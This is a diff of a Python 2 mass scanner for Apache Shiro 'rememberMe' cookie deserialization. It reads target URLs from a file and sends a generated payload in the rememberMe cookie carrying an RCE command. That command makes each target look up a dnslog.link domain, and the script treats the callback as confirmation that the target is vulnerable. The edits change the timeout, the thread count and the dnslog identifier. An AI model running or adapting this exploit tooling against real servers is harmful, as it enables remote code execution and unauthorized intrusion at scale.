@@ -22,10 +22,9 @@ def poc(url, rce_command):
         target = url
     try:
         payload = generator(rce_command, JAR_FILE)  # 生成payload
-        r = requests.get(target, cookies={'rememberMe': payload.decode()}, timeout=20,verify=False)  # 发送验证请求
+        r = requests.get(target, cookies={'rememberMe': payload.decode()}, timeout=10,verify=False)  # 发送验证请求
         # print r.text
     except Exception, e:
-        print(e)
         pass
     return False
 
@@ -54,7 +53,7 @@ def random_str(len):
 
 #查看dnslog状态
 def getdnslog(random_str):
-	dns_check = 'https://admin.dnslog.link/api/dns/f4c8e390/%s/' % random_str
+	dns_check = 'https://admin.dnslog.link/api/dns/xxxxxxx/%s/' % random_str#xxxxxxx为四叶草地址
 	res = requests.get(dns_check)
 	return res.text
 
@@ -69,7 +68,7 @@ def check_vuln():
 			break
 		try:
 		    random_str_ = random_str(8)
-		    poc(web_url,random_str_+".f4c8e390.dnslog.link")
+		    poc(web_url,random_str_+".xxxxxxx.dnslog.link")#xxxxxxx为四叶草地址
 		    result = getdnslog(random_str_)
 		    if result == 'True':
 		    	print "[+200] vuln apache shiro",web_url
@@ -83,7 +82,7 @@ if __name__ == '__main__':
 									description='Apache Shiro Scanner.By Stu.',
 									usage='scan.py [optional]')
 	parser.add_argument('-f',metavar='File',type=str,default='url.txt',help='Put Web url in url.txt')
-	parser.add_argument('-t',metavar='THREADS',type=int,default='100',help='Num of scan threads,default 100')
+	parser.add_argument('-t',metavar='THREADS',type=int,default='10',help='Num of scan threads,default 10')
 
 	if len(sys.argv)==1:
 		sys.argv.append('-h')
